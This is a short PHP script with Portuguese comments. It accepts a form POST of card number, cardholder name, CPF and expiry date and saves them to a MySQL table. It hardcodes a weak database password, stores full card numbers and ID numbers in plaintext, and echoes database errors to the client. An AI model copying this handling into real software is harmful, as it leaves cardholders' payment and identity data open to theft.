<?php
header('Content-Type: application/json');

$servername = "localhost";
$username = "gabriel";
$password = "123";
$dbname = "card_data";

function sendResponse($success, $message) {
    echo json_encode([
        'success' => $success,
        'message' => $message
    ]);
    exit();
}

try {
    $conn = new mysqli($servername, $username, $password, $dbname);

    if ($conn->connect_error) {
        throw new Exception("Falha na conexão: " . $conn->connect_error);
    }

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Sanitização e validação dos dados
        $card_number = filter_input(INPUT_POST, 'card-number', FILTER_SANITIZE_STRING);
        $name_text = filter_input(INPUT_POST, 'name-text', FILTER_SANITIZE_STRING);
        $cpf_text = filter_input(INPUT_POST, 'cpf-text', FILTER_SANITIZE_STRING);
        $valid_thru_text = filter_input(INPUT_POST, 'valid-thru-text', FILTER_SANITIZE_STRING);

        // Validação básica
        if (empty($card_number) || empty($name_text) || empty($cpf_text) || empty($valid_thru_text)) {
            throw new Exception("Todos os campos são obrigatórios");
        }

        // Preparar e executar a inserção
        $stmt = $conn->prepare("INSERT INTO card_info (card_number, name_text, cpf_text, valid_thru_text) VALUES (?, ?, ?, ?)");
        
        if (!$stmt) {
            throw new Exception("Erro na preparação da declaração: " . $conn->error);
        }

        $stmt->bind_param("ssss", $card_number, $name_text, $cpf_text, $valid_thru_text);

        if (!$stmt->execute()) {
            throw new Exception("Erro ao salvar os dados: " . $stmt->error);
        }

        $stmt->close();
        $conn->close();

        sendResponse(true, "Dados salvos com sucesso!");
    } else {
        throw new Exception("Método não permitido");
    }
} catch (Exception $e) {
    sendResponse(false, $e->getMessage());
}
?>
